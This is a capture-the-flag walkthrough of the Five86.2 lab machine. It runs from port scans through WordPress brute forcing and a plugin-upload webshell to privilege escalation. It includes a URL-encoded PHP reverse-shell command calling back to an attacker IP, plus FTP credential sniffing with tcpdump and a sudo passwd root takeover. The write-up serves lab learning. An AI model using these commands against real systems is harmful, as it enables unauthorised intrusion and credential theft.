Five86.2

Target IP: 192.168.136.28
Challenge Description: Do you know your network flows?

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.136.28 -p- returns the result shown in the image above. There are two TCP ports open: FTP and HTTP on their standard ports.


Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.136.28 -p 21,80 returns the result shown in the image above. The FTP application on port 21 seems to be ProFTPD 1.3.5e. The HTTP application on port 80 seems to be WordPress 5.1.4. Time to check them out.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application on port 80. I hovered over the Five86-2 title and received the string five86-2. This could possibly be the hostname of the target machine. I will insert this hostname inside my /etc/hosts file. I achieved this using the command sudo echo '192.168.136.28 five86-2' >> /etc/hosts.


After inserting the new hostname inside my /etc/hosts file, the webpage of the web application looks presentable as shown in the image above. There is one user called admin on the WordPress application. I did not find anything else useful. Time to enumerate this application further by performing a directory search and using the tool wpscan. I wish to check which users exist first.

Running the command wpscan --url http://five86-2/ --enumerate u returns the output shown above. This scan successfully identified the following users: admin, peter, barney, gillian, and stephen. The next step is to bruteforce their password.


I ran the command wpscan --url http://five86-2/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt to bruteforce the login of the users of the WordPress application. After some time, it successfully got a hit. It managed to obtain the valid credentials barney:spooky1 and stephen:apollo1. Depending on what type of level of access this user has, it might be useful.


Performing a scan to identify all plugins using the command wpscan --url http://five86-2/ --enumerate ap --plugins-detection aggressive returns the result shown in the image above. There are two plugins that stand out: insert-or-embed-articulate-content-into-wordpress 4.2995 and user-role-editor 4.52.2. Time to check if these plugins are vulnerable too.

Exploitation

Owning the WordPress via RCE Using insert-or-embed-articulate-content-into-wordpress 4.2995 Vulnerability


I checked out insert-or-embed-articulate-content-into-wordpress 4.2995 vulnerabilities and came across the website shown above. The PoC is also provided. I followed the instructions from the image above and created the PoC zip file. The rest of the steps are the following:

## 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)
## 3. Create a new Post -> Select `Add block` -> E-Learning -> Upload the poc.zip -> Insert as: Iframe -> Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)
## 4. Access the webshell from the URL displayed after upload similar to 
## 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)
## 3. Create a new Post -> Select `Add block` -> E-Learning -> Upload the poc.zip -> Insert as: Iframe -> Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)
## 4. Access the webshell from the URL displayed after upload similar to





I used the credentials barney:spooky1 and logged in at http://five86-2/wp-login.php. I notice this user has some contributors features enabled, such as they can create posts -- which is required by the exploit. After following the steps from the PoC, I can now issue RCE as shown in the last picture above. To access the shell, we must access it at http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php?cmd=id. On the PoC, the exploit directory is pointed at /wp-admin rather than /wp-content/. Time to obtain a reverse shell connection now.


I started a listener on my machine at port 8443. Then using the webshell, I deployed the URL encoded PHP reverse shell command php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.206%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. And now I have a reverse shell connection on my machine at port 8443 as shown in the picture above.

Privilege Escalation

Horizontal Privilege Escalation: User www-data to User stephen via Bruteforced Password

From previous enumration, I managed to bruteforce the password apollo1 of the user stephen for the WordPress application. Using the command su stephen and the password apollo1, I managed to successfully elevate my privileges to this user now as shown in the image above.

Horizontal Privilege Escalation: User stephen to User paul via tcpdump (FTP Credentials Sniffing)

Running the command /usr/sbin/getcap / -r 2>/dev/null returns the result shown in the image above. This user stephen has capabilities set for the binary /usr/sbin/tcpdump. This means this user can sniff network traffic.


Issuing the command ps -auxw returns the result shown in the image above. It's interesting as the user paul is uploading the file file.txt via FTP. Since FTP is not encrypted, the credentials are in plaintext. As the user stephen can sniff network traffic, this tcpdump binary can be used to sniff out the network packets of the user paul.


I ran the command tcpdump D to check the interfaces. To make it easier for myself, I decided to run the binary tcpdump across all the interfaces using the command timeout 180 tcpdump -w sniff.pcap -i any.


After some time, the packet sniffing came to an end. To check through the contents of the capture, I ran the command tcpdump -r sniff.pcap and obtained the FTP credentials paul:esomepasswford belonging to the user paul. I can attempt to login as this user now via the FTP on port 21.


I logged into the FTP application as the user paul. But it wasn't helpful as the file.txt -- that was being put via FTP -- was empty. Their other files were not helpful either. Maybe I can try to switch to this user using su?


And bingo. It worked. I stopped the shell and regained reverse shell again using the webshell. Then using the command su paul and the password esomepasswford, I managed to switch to this user successfully.

Vertical Privilege Escalation: User paul to User root via Password Change Using /usr/bin/passwd (Weak Misconfiguration)

Running the command sudo -l shows the user paul execute the command /usr/bin/service as peter. Obtaining a shell as paul is doable by running the command sudo -u peter /usr/sbin/service ../../../../../bin/sh. This command just opens a shell by using path traversal. And doing so, I now have a shell as the user peter.


And running the command sudo -l shows the executable commands above in the picture above. The first entry (ALL : ALL) ALL is not exploitable as I do not have the password for this user. However, the second entry (root) NOPASSWD: /usr/bin/passwd is exploitable. This command can be run as root to change the password; therefore, it is possible to change the password belonging to the root user and switch to this user to obtain a root shell.


Firstly, I ran the command sudo -u root /usr/bin/passwd root to change the password of user root. Then I set the password to pwned. Then using the command su root and the password pwned, I managed to successfully switch to the user root :) Now I have root level access on the target machine as shown in the image above.
